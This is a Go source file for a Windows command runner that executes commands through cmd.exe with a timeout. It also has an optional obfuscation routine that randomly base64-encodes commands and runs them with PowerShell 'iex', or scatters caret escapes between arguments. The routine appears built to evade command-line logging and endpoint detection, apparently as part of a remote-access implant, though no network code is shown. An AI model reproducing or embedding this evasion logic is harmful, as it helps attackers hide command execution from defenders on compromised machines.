package shell

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os/exec"
	"strings"
	"time"
)

// Run executes a shell command with a timeout and returns its output.
// Windows: uses cmd.exe /C.
func Run(command string, timeout time.Duration) (string, error) {
	cmdStr := command
	if CommandObfuscate {
		cmdStr = obfuscate(command)
	}

	cmd := exec.Command("cmd.exe", "/C", cmdStr)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("start failed: %w", err)
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		<-done
		out := strings.TrimSpace(stdout.String())
		return out, fmt.Errorf("timeout after %v", timeout)
	case err := <-done:
		if err != nil {
			out := strings.TrimSpace(stdout.String())
			errStr := strings.TrimSpace(stderr.String())
			if errStr != "" {
				if out != "" {
					return out, fmt.Errorf("%s (stderr: %s)", errStr, err)
				}
				return "", fmt.Errorf("%s: %w", errStr, err)
			}
			if out != "" {
				return out, err
			}
			return "", fmt.Errorf("execution failed: %w", err)
		}
		return strings.TrimSpace(stdout.String()), nil
	}
}

func obfuscate(cmd string) string {
	if rand.Intn(4) == 0 {
		return cmd
	}
	method := rand.Intn(2)
	switch method {
	case 0:
		encoded := base64.StdEncoding.EncodeToString([]byte(cmd))
		return fmt.Sprintf("powershell -Command \"$d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')); iex $d\"", encoded)
	case 1:
		parts := strings.Fields(cmd)
		var result []string
		for i, p := range parts {
			result = append(result, p)
			if i > 0 && i < len(parts)-1 && rand.Intn(2) == 0 {
				result = append(result, "^") // Windows escape
			}
		}
		return strings.Join(result, " ")
	}
	return cmd
}
